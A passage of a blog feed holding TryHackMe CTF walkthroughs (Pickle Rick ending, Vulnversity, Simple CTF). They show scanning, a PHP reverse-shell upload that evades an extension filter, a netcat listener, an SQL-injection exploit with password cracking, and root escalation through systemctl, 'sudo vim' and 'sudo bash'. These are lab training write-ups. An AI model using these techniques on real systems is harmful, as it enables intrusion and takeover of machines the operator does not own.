<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc -nlvp 4444
</code></pre></div></div>
<p>I go to the pentest monkey cheat sheet <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">here</a>.
And I’m trying the codes on the page. Those two are working.</p>

<p><img src="/assets/img/tryhackme/pickle_rick/shell.png" alt="shell" /></p>

<p>And we are inside.</p>

<p><img src="/assets/img/tryhackme/pickle_rick/nc.png" alt="nc" /></p>

<p>Now we can go to the rick directory.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cd /home/rick
$ cat second\ ingredients
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/pickle_rick/second.png" alt="second" /></p>

<p><strong>Answer : <code class="language-plaintext highlighter-rouge">jerry tear</code></strong></p>

<p><br /></p>

<h3 id="3-whats-the-final-ingredient-rick-needs">3. Whats the final ingredient Rick needs?</h3>

<p>For the third ingredient, we need to get root privileges.</p>

<p><img src="/assets/img/tryhackme/pickle_rick/privesc.png" alt="privesc" /></p>

<p>No password is set for root.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo -l
$ sudo bash
</code></pre></div></div>

<p>Now we can reach the third ingredient and save rick.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ls -la /root
$ cat /root/3rd.txt
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/pickle_rick/3rd.png" alt="3rd" /></p>

<p><strong>Answer : <code class="language-plaintext highlighter-rouge">fleeb juice</code></strong></p>

<p><br /></p>

<p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>

<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>furkn.dniz@gmail.com</email></author><category term="TryHackMe" /><category term="ctf," /><category term="gobuster," /><category term="linux" /><summary type="html"><![CDATA[This is an easy CTF. This Rick and Morty themed challenge requires you to exploit a webserver to find 3 ingredients that will help Rick make his potion to transform himself back into a human from a pickle. Deploy the virtual machine on this task and explore the web application: “http://target-ip/”]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/picle_rick.jpeg" /><media:content medium="image" url="http://localhost:4000/assets/img/picle_rick.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - Vulnversity</title><link href="http://localhost:4000/tryhackme-vulnversity/" rel="alternate" type="text/html" title="TryHackMe - Vulnversity" /><published>2023-03-14T00:00:00+03:00</published><updated>2023-03-14T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-vulnversity</id><content type="html" xml:base="http://localhost:4000/tryhackme-vulnversity/"><![CDATA[<p>This is an easy CTF. Let’s start.</p>

<p><br /></p>

<h2 id="1-deploy-the-machine">1. Deploy the machine</h2>

<p>Connect to our network and deploy this machine. If you are unsure on how to get connected, complete the OpenVPN room first.</p>

<p><br /></p>

<hr />

<p><br /></p>

<h2 id="2-reconnaissance">2. Reconnaissance</h2>

<p>Now that you’ve found the code for the backdoor, it’s time to analyse it.
Gather information about this machine using a network scanning tool called <code class="language-plaintext highlighter-rouge">nmap</code>.</p>

<p><br /></p>

<h3 id="21-scan-the-box-how-many-ports-are-open">2.1 Scan the box, how many ports are open?</h3>

<p>Let’s find out how many ports are open on the target with a simple <code class="language-plaintext highlighter-rouge">nmap</code> scan.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSV 10.10.56.244
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/vulnversity/nmap.png" alt="nmap" /></p>

<p><strong>Answer: <code class="language-plaintext highlighter-rouge">6</code></strong></p>

<p><br /></p>

<h3 id="22-what-version-of-the-squid-proxy-is-running-on-the-machine">2.2 What version of the squid proxy is running on the machine?</h3>

<p>As you may have noticed from the previous question, squid proxy is http-proxy running on port <code class="language-plaintext highlighter-rouge">3128/tcp</code>.</p>

<p><strong>Answer: <code class="language-plaintext highlighter-rouge">3.5.12</code></strong></p>

<p><br /></p>

<h3 id="23-how-many-ports-will-nmap-scan-if-the-flag--p-400-was-used">2.3 How many ports will nmap scan if the flag -p-400 was used?</h3>

<p><strong>Answer: <code class="language-plaintext highlighter-rouge">400</code></strong></p>

<p><br /></p>

<h3 id="24-using-the-nmap-flag--n-what-will-it-not-resolve">2.4 Using the nmap flag -n what will it not resolve?</h3>

<p><strong>Answer: <code class="language-plaintext highlighter-rouge">DNS</code></strong></p>

<p><br /></p>

<h3 id="25-what-is-the-most-likely-operating-system-this-machine-is-running">2.5 What is the most likely operating system this machine is running?</h3>

<p><strong>Answer: <code class="language-plaintext highlighter-rouge">ubuntu</code></strong></p>

<p><br /></p>

<h3 id="26-what-port-is-the-web-server-running-on">2.6 What port is the web server running on?</h3>

<p><strong>Answer: <code class="language-plaintext highlighter-rouge">3333</code></strong></p>

<p><br /></p>

<hr />

<p><br /></p>

<h2 id="3-locating-directories-using-gobuster">3. Locating directories using GoBuster</h2>

<p>Using a fast directory discovery tool called GoBuster you will locate a directory that you can use to upload a shell to.</p>

<p><br /></p>

<h3 id="31-what-is-the-directory-that-has-an-upload-form-page">3.1 What is the directory that has an upload form page?</h3>

<p>Now, let’s do a directory scan using <code class="language-plaintext highlighter-rouge">gobuster</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>`$ gobuster dir -u http://10.10.56.244:3333/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/vulnversity/gobuster.png" alt="gobuster" /></p>

<p><strong>Answer: <code class="language-plaintext highlighter-rouge">/internal/</code></strong></p>

<p><br /></p>

<hr />

<p><br /></p>

<h2 id="4-compromise-the-webserver">4. Compromise the webserver</h2>

<p>Now you have found a form to upload files, we can leverage this to upload and execute our payload that will lead to compromising the web server.</p>

<p><br /></p>

<h3 id="41-what-common-file-type-which-youd-want-to-upload-to-exploit-the-server-is-blocked-try-a-couple-to-find-out">4.1 What common file type, which you’d want to upload to exploit the server, is blocked? Try a couple to find out.</h3>

<p>I downloaded and tried pentest monkey’s php-reverse-shell.php file, but it didn’t upload.
<a href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php">php-reverse-shell.php</a></p>

<p><img src="/assets/img/tryhackme/vulnversity/error.png" alt="error" /></p>

<p><strong>Answer: <code class="language-plaintext highlighter-rouge">.php</code></strong></p>

<p><br /></p>

<h3 id="42-run-this-attack-what-extension-is-allowed">4.2 Run this attack, what extension is allowed?</h3>

<p>Since the .php extension does not work here, we need to try other php extensions instead. If you want, you can do it manually or by using burp suite as tryhackme explained, I don’t see the need to use burp suite for now.</p>

<p><img src="/assets/img/tryhackme/vulnversity/success.png" alt="success" /></p>

<p><strong>Answer: <code class="language-plaintext highlighter-rouge">.phtml</code></strong></p>

<p><br /></p>

<h3 id="43-what-is-the-name-of-the-user-who-manages-the-webserver">4.3 What is the name of the user who manages the webserver?</h3>

<p>Now we edit the reverse shell (we adjust the ip and port parts according to ourselves) and upload it.</p>

<p><img src="/assets/img/tryhackme/vulnversity/set.png" alt="set" /></p>

<p>Then we open a listener for the port we wrote in the shell using <code class="language-plaintext highlighter-rouge">netcat</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc -nlvp 4444
</code></pre></div></div>

<p>Then we visit the shell that we uploaded to the target site.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ http://10.10.56.244:3333/internal/uploads/shell.phtml
</code></pre></div></div>

<p>And we are inside.</p>

<p><img src="/assets/img/tryhackme/vulnversity/in.png" alt="in" /></p>

<p>Now, to find out who the user is, we go to the <code class="language-plaintext highlighter-rouge">/home</code> directory and list the files using the <code class="language-plaintext highlighter-rouge">ls -la</code> command. There should be a folder with the user’s name here.</p>

<p><img src="/assets/img/tryhackme/vulnversity/bill.png" alt="bill" /></p>

<p><strong>Answer: <code class="language-plaintext highlighter-rouge">bill</code></strong></p>

<p><br /></p>

<h3 id="44-what-is-the-user-flag">4.4 What is the user flag?</h3>

<p>Now we open the <code class="language-plaintext highlighter-rouge">user.txt</code> owned by the user, Bill.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat /home/bill/user.txt
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/vulnversity/user-flag.png" alt="user-flag" /></p>

<p><br /></p>

<hr />

<p><br /></p>

<h2 id="5-privilege-escalation">5. Privilege Escalation</h2>

<p>Now you have compromised this machine, we are going to escalate our privileges and become the superuser (root).</p>

<p><br /></p>

<h3 id="51-on-the-system-search-for-all-suid-files-what-file-stands-out">5.1 On the system, search for all SUID files. What file stands out?</h3>

<p><em>Hint: Use the command: find / -user root -perm -4000 -print 2&gt;/dev/null</em></p>

<p><img src="/assets/img/tryhackme/vulnversity/find.png" alt="find" /></p>

<p><strong>Answer: <code class="language-plaintext highlighter-rouge">/bin/systemctl</code></strong></p>

<p><br /></p>

<h3 id="52-become-root-and-get-the-last-flag-rootroottxt">5.2 Become root and get the last flag (/root/root.txt).</h3>

<p><em>Hint: /bin/systemctl</em></p>

<p>Let’s enter the following codes one by one to raise privileges and access root.txt.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat &gt; /tmp/flag.service &lt;&lt; EOF
&gt; [Service]
&gt; ExecStart=/bin/bash -c "cat /root/root.txt &gt; /tmp/flag.txt"
&gt; [Install]
&gt; WantedBy=multi-user.target
&gt; EOF
$ /bin/systemctl link /tmp/flag.service
$ /bin/systemctl enable --now /tmp/flag.service
$ cat /tmp/flag.txt 
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/vulnversity/root-flag.png" alt="root-flag" /></p>

<p><br /></p>

<p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>

<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>furkn.dniz@gmail.com</email></author><category term="TryHackMe" /><category term="recon," /><category term="privesc," /><category term="webappsec" /><summary type="html"><![CDATA[This is an easy CTF. Let’s start.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/vulnversity.png" /><media:content medium="image" url="http://localhost:4000/assets/img/vulnversity.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - Simple CTF</title><link href="http://localhost:4000/tryhackme-simple-ctf/" rel="alternate" type="text/html" title="TryHackMe - Simple CTF" /><published>2023-03-13T00:00:00+03:00</published><updated>2023-03-13T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-simple-ctf</id><content type="html" xml:base="http://localhost:4000/tryhackme-simple-ctf/"><![CDATA[<p>This is an easy CTF. Let’s start.</p>

<p><br /></p>

<h3 id="1-how-many-services-are-running-under-port-1000">1. How many services are running under port 1000?</h3>

<p>We first run a <code class="language-plaintext highlighter-rouge">nmap</code> scan to find running ports.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSV 10.10.22.97
</code></pre></div></div>
<p><img src="/assets/img/tryhackme/simple_ctf/nmap.png" alt="nmap" /></p>

<p>As you can see, a total of 3 ports are running. These are <code class="language-plaintext highlighter-rouge">21/tcp FTP</code>, <code class="language-plaintext highlighter-rouge">80/tcp HTTP</code>, <code class="language-plaintext highlighter-rouge">and 2222/tcp SSH.</code></p>

<p><strong>Answer : <code class="language-plaintext highlighter-rouge">2</code></strong></p>

<p><br /></p>

<h3 id="2-what-is-running-on-the-higher-port">2. What is running on the higher port?</h3>

<p>As you will remember from the previous question, the highest port is 2222/tcp. And SSH is running on this port.</p>

<p><strong>Answer : <code class="language-plaintext highlighter-rouge">SSH</code></strong></p>

<p><br /></p>

<h3 id="3-whats-the-cve-youre-using-against-the-application">3. What’s the CVE you’re using against the application?</h3>

<p>When we visit the website, we see the default page of apache.</p>

<p><img src="/assets/img/tryhackme/simple_ctf/apache.png" alt="apache" /></p>

<p>First of all, I did a <code class="language-plaintext highlighter-rouge">nikto</code> scan, but no results came out. Now let’s do a directory scan with <code class="language-plaintext highlighter-rouge">gobuster</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gobuster dir -u http://10.10.22.97/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/simple_ctf/gobuster.png" alt="gobuster" /></p>

<p>Yes, we discovered the <code class="language-plaintext highlighter-rouge">/simple/</code> directory here. Let’s see what it contains.</p>

<p><img src="/assets/img/tryhackme/simple_ctf/cms.png" alt="cms" /></p>

<p>A CMS page appears. This is the app the question tells us.
At the bottom of the page, we find the CMS version.</p>

<p><img src="/assets/img/tryhackme/simple_ctf/version.png" alt="version" /></p>

<p>Now, we’re looking for any CMS Made Simple vulnerability in exploit-db, and let’s not forget that the version is <code class="language-plaintext highlighter-rouge">2.2.8</code>.</p>

<p><img src="/assets/img/tryhackme/simple_ctf/db.png" alt="db" /></p>

<p>As a result of the search, we detect the vulnerability that is suitable for the CMS version of our target. 
<a href="https://www.exploit-db.com/exploits/46635">https://www.exploit-db.com/exploits/46635</a></p>

<p><img src="/assets/img/tryhackme/simple_ctf/exploit.png" alt="exploit" /></p>

<p><strong>Answer : <code class="language-plaintext highlighter-rouge">CVE- 2019-9053 </code></strong></p>

<p><br /></p>

<h3 id="4-to-what-kind-of-vulnerability-is-the-application-vulnerable">4. To what kind of vulnerability is the application vulnerable?</h3>

<p>As you can see in the previous question, the vulnerability is <code class="language-plaintext highlighter-rouge">SQL Injection</code>.</p>

<p><strong>Answer : <code class="language-plaintext highlighter-rouge">sqli</code></strong></p>

<p><br /></p>

<h3 id="5-whats-the-password">5. What’s the password?</h3>

<p><em>Hint: You can use /usr/share/seclists/Passwords/Common-Credentials/best110.txt to crack the pass</em></p>

<p>We need to download the exploit in exploit-db and run it as it says.</p>

<p><img src="/assets/img/tryhackme/simple_ctf/how.png" alt="how" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> $ python3 46635.py -u http://10.10.52.237/simple/ --crack -w /usr/share/seclists/Passwords/Common-Credentials/best110.txt
</code></pre></div></div>

<p>We want to run it but we can’t. I guess we cannot run this code because it is written in the python2 script, and we encounter many errors. I fixed it as best I could, you can download and run it from <a href="/assets/img/tryhackme/simple_ctf/46635.py">here</a>. If you want to fix it, you can ask in the comments.</p>

<p><img src="/assets/img/tryhackme/simple_ctf/pass.png" alt="pass" /></p>

<p><strong>Answer : <code class="language-plaintext highlighter-rouge">secret</code></strong></p>

<p><br /></p>

<h3 id="6-where-can-you-login-with-the-details-obtained">6. Where can you login with the details obtained?</h3>

<p>We may use these credentials to login against ssh <code class="language-plaintext highlighter-rouge">(running on port 2222)</code></p>

<p><strong>Answer : <code class="language-plaintext highlighter-rouge">ssh</code></strong></p>

<p><br /></p>

<h3 id="7-whats-the-user-flag">7. What’s the user flag?</h3>

<p>Using the information we collect, we login to <code class="language-plaintext highlighter-rouge">ssh</code> and then we get the <code class="language-plaintext highlighter-rouge">user.txt</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> $ ssh mitch@10.10.52.237 -p 2222
 $ whoami
 $ cat user.txt
</code></pre></div></div>
<p><img src="/assets/img/tryhackme/simple_ctf/login.png" alt="login" /></p>

<p><strong>Answer : <code class="language-plaintext highlighter-rouge">G00d j0b, keep up!</code></strong></p>

<p><br /></p>

<h3 id="8-is-there-any-other-user-in-the-home-directory-whats-its-name">8. Is there any other user in the home directory? What’s its name?</h3>

<p>We go to the /home directory and look at the users with the <code class="language-plaintext highlighter-rouge">ls -al</code> command.</p>

<p><img src="/assets/img/tryhackme/simple_ctf/users.png" alt="users" /></p>

<p><strong>Answer : <code class="language-plaintext highlighter-rouge">sunbath</code></strong></p>

<p><br /></p>

<h3 id="9-what-can-you-leverage-to-spawn-a-privileged-shell">9. What can you leverage to spawn a privileged shell?</h3>

<p>First, we run the <code class="language-plaintext highlighter-rouge">sudo -l</code> command. We notice that Vim can run without the need for a root password.</p>

<p><strong>Answer : <code class="language-plaintext highlighter-rouge">vim</code></strong></p>

<p><br /></p>

<h3 id="10-whats-the-root-flag">10. What’s the root flag?</h3>

<p>Now we can get root privileges using vim. The code we will run is as follows.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo vim -c '!sh'
$ whoami
$ cat /root/root.txt
</code></pre></div></div>
<p><img src="/assets/img/tryhackme/simple_ctf/root.png" alt="root" /></p>

<p><strong>Answer : <code class="language-plaintext highlighter-rouge">W3ll d0n3. You made it!</code></strong></p>

<p><br /></p>

<p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>

<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>furkn.dniz@gmail.com</email></author><category term="TryHackMe" /><category term="security," /><category term="enumeration," /><category term="privesc" /><summary type="html"><![CDATA[This is an easy CTF. Let’s start.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/simple.png" /><media:content medium="image" url="http://localhost:4000/assets/img/simple.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>